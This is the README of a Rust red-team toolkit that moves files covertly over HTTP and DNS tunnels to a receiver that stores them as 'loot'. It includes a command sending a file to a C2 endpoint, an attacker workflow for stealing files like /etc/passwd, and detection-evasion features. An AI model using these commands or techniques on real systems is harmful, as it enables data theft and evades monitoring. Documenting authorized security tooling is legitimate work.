# Hunk - Red Team Exfiltration Toolkit

## Overview

Hunk is a small Cargo workspace implementing a client/server exfiltration research toolset. Its primary objective is twofold:
- Provide a practical Rust learning project for networking, async, and systems programming.
- Offer a controlled environment to study data exfiltration techniques used during authorized Red Team engagements (HTTP and DNS covert channels, chunking, layered encoding, and payload encryption).

## Project Structure

hunk is organized as a workspace with two focused crates:

- `runner/` — client-side agent that encodes, optionally encrypts, and transmits file chunks
- `shelter/` — server-side receiver that decodes, decrypts, assembles, and persists files
- `Cargo.toml` — workspace manifest
- `README.md` — this file (root)

### Runner (brief)

Runner is a CLI agent that:
- Reads files, optionally encrypts them with ChaCha20-Poly1305 AEAD cipher
- Encodes encrypted/plaintext data (Base64 → hex) and splits into chunks
- Transmits chunks over HTTP POST or as DNS TXT subdomain queries (UDP/TCP)
- Supports configurable chunk counts, inter-chunk delays, and key management strategies

Example (HTTP with encryption):
cargo run --release -p runner -- exfil http --src-files /path/to/file.txt -u https://c2/receive --chunks 10 --delay 500 --cipher-key str=my_32_byte_encryption_key_here

See `runner/README.md` for full usage and options.

### Shelter (brief)

Shelter is a receiver that:
- Listens as an HTTP server (POST body payloads) or DNS authoritative server (subdomain payloads)
- Decodes payloads (hex → Base64 → UTF-8)
- Decrypts encrypted payloads using provided ChaCha20-Poly1305 keys
- Indexes chunks in-memory and reassembles files when the final chunk arrives
- Persists reconstructed files to a configurable `loot` directory

Example (HTTP with encryption):
cargo run --release -p shelter -- http-server -l 0.0.0.0:8080 --output-dir ./loot --cipher-key my_32_byte_encryption_key_here

See `shelter/README.md` for detailed configuration and deployment options (including Docker).

## End-to-End Workflow

1. Runner reads a file and optionally encrypts it using ChaCha20-Poly1305 AEAD.
2. Runner builds a root node (metadata) and file chunk nodes from the file/encrypted data.
3. Runner encodes each node (Base64 → hex).
4. Runner sends encoded nodes over HTTP POST or as DNS query subdomains to Shelter.
5. Shelter decodes incoming nodes, decrypts if needed, enqueues them, and stores chunks in a sorted in-memory structure.
6. When an end marker is received, Shelter assembles, decrypts, hex-decodes, concatenates bytes, and writes the file to the loot directory.

Diagram:
Compromised System (Runner) → [HTTP/DNS] → Shelter (Receiver) → Loot Directory

With optional payload encryption at both ends using ChaCha20-Poly1305.

## Building the Project

### Prerequisites
- Rust toolchain (rustup) — Rust 1.70+ recommended
- Standard build toolchain for your OS (C toolchain/linker present; e.g., build-essential, Xcode CLI tools)

### Build instructions
Build all workspace binaries:
cargo build --release
Binaries: `target/release/runner`, `target/release/shelter`

Build a single package:
# Runner only
cargo build --release -p runner

# Shelter only
cargo build --release -p shelter

For development runs, use `cargo run --` with the component command (see examples above or the component README files).


## Operational Model

### Scenario: Exfiltrate Sensitive Files

1. **Attacker compromises a system** and deploys the Runner binary
2. **Runner encodes and fragments** target files (e.g., `/etc/passwd`, database dumps)
3. **Runner transmits chunks** to attacker's Shelter server via HTTP or DNS
4. **Shelter receives, decodes, and assembles** file portions in real-time
5. **Reconstructed files** are written to the loot directory for analysis

### Stealth Considerations

- **Configurable delays** between chunk transmissions to avoid detection
- **Multiple exfiltration channels** (HTTP, DNS) to evade network monitoring
- **Nested encoding** (base64 + hex) to obfuscate payloads from pattern matching
- **DNS tunneling** leverages legitimate DNS traffic to bypass firewall rules

## Learning Goals

This project serves as a practical learning platform for:

- **Rust fundamentals** — Async/await, error handling, CLI argument parsing, networking
- **Cryptography & Encoding** — Base64, hex encoding, ChaCha20-Poly1305 AEAD encryption, DNS protocol constraints
- **Network Programming** — HTTP servers (Actix-web), DNS client/server implementation
- **Systems Programming** — File I/O, process spawning, environment configuration
- **Security Concepts** — Data exfiltration, covert channels, operational security, payload encryption

## Research Topics Covered

- **Protocol-based Exfiltration** — Using HTTP and DNS as covert data channels
- **Payload Encryption** — ChaCha20-Poly1305 AEAD cipher for authenticated encryption
- **Encoding Obfuscation** — Nested encoding schemes to evade detection
- **Key Management** — Multiple key retrieval strategies (hardcoded, file-based, URL-based)
- **Asynchronous Processing** — Non-blocking I/O for high-performance data handling
- **Error Resilience** — Handling incomplete/out-of-order data chunks
- **Network Stealth** — Inter-packet delays and DNS tunneling for evasion

## Disclaimer

⚠️ **LEGAL NOTICE**

This toolkit is provided for **authorized Red Team engagements and security research purposes only**. Unauthorized access to computer systems and unauthorized data exfiltration are illegal in most jurisdictions.

**Before using this toolkit:**
- Obtain explicit written authorization from system owners
- Ensure compliance with all applicable laws and regulations
- Follow responsible disclosure practices
- Document all authorized security activities

**No Warranty:** This software is provided "as is" without any warranty. The authors assume no liability for misuse or damages resulting from its use.

See individual component README files for additional security considerations and disclaimers.

## Contributing

Contributions are welcome! Please ensure:
1. Code follows Rust idioms and passes `cargo fmt` and `cargo clippy`
2. New features include documentation and error handling
3. Security implications are carefully considered

## License

See the LICENSE file in the repository root for details.

## Quick Reference

| Tool | Purpose | Commands |
|------|---------|----------|
| **Runner** | Data exfiltration agent | `exfil http`, `exfil dns` |
| **Shelter** | File receiver & reconstructor | `http-server` |

For detailed documentation on each component, see:
- `runner/README.md` — HTTP and DNS exfiltration techniques
- `shelter/README.md` — File reconstruction and persistence

---

**Version:** 0.1.0  
**Language:** Rust  
**Edition:** 2021  
**Status:** Active Development
